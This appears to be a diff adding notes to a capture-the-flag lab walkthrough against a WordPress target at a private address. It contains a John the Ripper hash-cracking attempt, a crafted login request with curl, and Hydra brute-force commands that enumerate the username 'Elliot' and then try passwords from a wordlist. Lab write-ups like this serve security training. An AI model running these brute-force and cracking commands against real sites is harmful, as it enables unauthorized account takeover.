@@ -5,3 +5,28 @@ key-1-of-3.txt
 
 https://10.0.4.5/key-1-of-3.txt
 073403c8a58a1f80d943455fb30724b9
+
+Let's try to hack the hash:
+john --wordlist=fsocity.dic --format=raw-md4 hash.txt
+There is no answer for this hash in fsocity.dic.
+
+log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1
+
+curl -v --data 'log=user&pwd=pwd&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1' --cookie 'wordpress_test_cookie=WP+Cookie+check' http://10.0.4.5/wp-login.php
+
+hydra -L fsocity.dic -p admin 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:Invalid username" -V
+
+[80][http-post-form] host: 10.0.4.5   login: Elliot   password: admin
+found the right username. Now I am gonna look for a password
+
+hydra -l Elliot -P fsocity.dic 10.0.4.5 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.4.5%2Fwp-admin%2F&testcookie=1:The password you entered" -V
+
+Looks like it does not work.
+
+But we know that there is a user named elliot.
+
+WordPress version 4.3.32
+
+
+
+
